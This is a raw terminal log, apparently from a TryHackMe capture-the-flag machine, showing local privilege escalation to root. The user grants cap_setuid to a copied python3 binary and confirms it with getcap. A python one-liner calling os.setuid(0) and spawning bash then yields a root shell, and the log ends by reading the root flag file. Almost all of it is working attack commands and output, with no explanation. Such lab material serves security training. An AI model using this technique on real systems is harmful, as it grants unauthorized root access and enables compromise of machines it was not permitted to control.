-rw-r--r--  1 annie annie    3771 Mar 23  2022 .bashrc
drwx------  8 annie annie    4096 Mar 23  2022 .cache
drwx------  9 annie annie    4096 Mar 23  2022 .config
drwx------  3 annie annie    4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Downloads
drwx------  3 annie annie    4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie     640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie    4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie     807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Public
-rwxr-xr-x  1 annie annie 4526456 Jun 18 10:27 python3
-rw-r--r--  1 root  root       66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie       0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie      23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Videos
annie@desktop:~$ setcap cap_setuid+ep ./python3
annie@desktop:~$ getcap -r / 2>/dev/null
/home/annie/python3 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:~$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@desktop:~# ls -la 
total 4520
drwxr-xr-x 17 annie annie    4096 Jun 18 10:27 .
drwxr-xr-x  3 root  root     4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie    4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie      41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie       9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie     220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie    3771 Mar 23  2022 .bashrc
drwx------  8 annie annie    4096 Mar 23  2022 .cache
drwx------  9 annie annie    4096 Mar 23  2022 .config
drwx------  3 annie annie    4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Downloads
drwx------  3 annie annie    4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie     640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie    4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie     807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Public
-rwxr-xr-x  1 annie annie 4526456 Jun 18 10:27 python3
-rw-r--r--  1 root  root       66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie       0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie      23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 Videos
root@desktop:~# cat /root/root.txt
THM{0nly_th3m_5.5.2_D3sk}
root@desktop:~# 

```